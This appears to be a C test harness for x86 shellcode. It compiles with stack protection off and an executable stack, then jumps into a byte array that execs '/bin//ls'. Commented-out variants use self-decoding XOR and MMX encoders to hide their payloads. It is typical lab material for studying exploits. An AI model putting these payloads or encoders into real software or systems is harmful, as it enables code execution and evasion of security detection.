//gcc -fno-stack-protector -z execstack TestShellcode.c -o TestShell
//gcc -fno-stack-protector -z execstack TestShellcode.c -o TestShellCode -m32
//
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

	

//"\x89\xc3\x31\xd8\x89\x44\x24\xfc\x83\xec\x04\xbe\x1e\x1e\x62\x57\x81\xc6\x11\x11\x11\x11\x89\x74\x24\xfc\xc7\x44\x24\xf8\x2f\x62\x6e\x83\xec\x08\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
//"\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\xc8\xcb\xd9\xc2\xc2\xc8\xc3\xc4\x85\xc2\x85\x85\x85\x85\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";
//"\xeb\x09\x5e\x80\x36\xaa\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x41\xb0\xf4\x9b\x71\x22\xf4\xa3\x23\xdc\xa0\x23\xf4\xa4\x27\xb4\x27\xe4\xa0\x27\xfc\xa4\x9b\x6a\x1a\xa1\x67\x2a\x42\x4b\x55\x55\x55\x85\xc8\xc3\xc4\x85\xc8\xcb\xd9\xc2\xeb\xe8\xe8\xe8\xe8\xe9\xe9\xe9\xe9";

main()
{
	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();
}
